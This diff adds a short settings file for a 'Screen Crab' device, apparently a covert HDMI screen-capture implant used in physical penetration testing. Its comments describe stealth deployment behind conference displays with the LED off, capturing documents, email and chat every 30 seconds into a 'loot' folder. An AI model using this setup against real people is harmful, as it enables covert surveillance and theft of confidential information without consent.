@@ -1,0 +1,19 @@
+# ================================================================
+#  Screen Crab Config : interval-monitor
+#  Use case           : Broad session monitoring. Captures every
+#                       30 seconds regardless of activity. Catches
+#                       documents, email, browser sessions, chat,
+#                       internal web apps — full work session record.
+#  LED                : OFF (stealth)
+#  Deploy             : Between laptop and external monitor, or
+#                       behind a conference room display.
+# ================================================================
+
+TRIGGER=INTERVAL
+INTERVAL=30
+CAPTURE=IMAGE
+QUALITY=75
+RESOLUTION=720p
+LED=OFF
+LOOT_DIR=loot/interval-monitor
+MAX_STORAGE=16384
